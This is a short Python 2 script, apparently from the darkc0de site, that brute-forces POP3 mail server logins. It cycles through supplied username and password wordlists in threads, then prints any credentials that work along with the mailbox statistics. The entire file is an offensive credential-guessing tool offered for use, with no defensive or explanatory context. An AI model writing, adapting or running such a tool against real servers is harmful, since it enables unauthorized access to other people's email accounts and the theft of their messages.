#!usr/bin/python
#Pop3 Brute Forcer
#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import threading, time, random, sys, poplib
from copy import copy

if len(sys.argv) !=4:
	print "Usage: ./popbrute.py <server> <userlist> <wordlist>"
	sys.exit(1)

try:
  	users = open(sys.argv[2], "r").readlines()
except(IOError): 
  	print "Error: Check your userlist path\n"
  	sys.exit(1)
  
try:
  	words = open(sys.argv[3], "r").readlines()
except(IOError): 
  	print "Error: Check your wordlist path\n"
  	sys.exit(1)
	
try:
	pop = poplib.POP3(sys.argv[1])
	welcome = pop.getwelcome()
	pop.quit()
except (poplib.error_proto): 
	welcome = "No Response"
	pass

print "\n\t   d3hydr8[at]gmail[dot]com popBruteForcer v1.0"
print "\t--------------------------------------------------\n"
print "[+] Server:",sys.argv[1]
print "[+] Users Loaded:",len(users)
print "[+] Words Loaded:",len(words)
print "[+] Server response:",welcome,"\n"

wordlist = copy(words)

def reloader():
	for word in wordlist:
		words.append(word)

def getword():
	lock = threading.Lock()
	lock.acquire()
	if len(words) != 0:
		value = random.sample(words,  1)
		words.remove(value[0])
		
	else:
		print "Reloading Wordlist - Changing User\n"
		reloader()
		value = random.sample(words,  1)
		users.remove(users[0])
		
	lock.release()
	return value[0][:-1], users[0][:-1]
		
class Worker(threading.Thread):
	
	def run(self):
		value, user = getword()
		try:
			print "-"*12
			print "User:",user,"Password:",value
			pop = poplib.POP3(sys.argv[1])
			pop.user(user)
			pop.pass_(value)
			print "\t\nLogin successful:",value, user
			print pop.stat()
			pop.quit()
			work.join()
			sys.exit(2)
		except (poplib.error_proto), msg: 
			#print "An error occurred:", msg
			pass
 
for i in range(len(words)*len(users)):
	work = Worker()
	work.start()
	time.sleep(1)
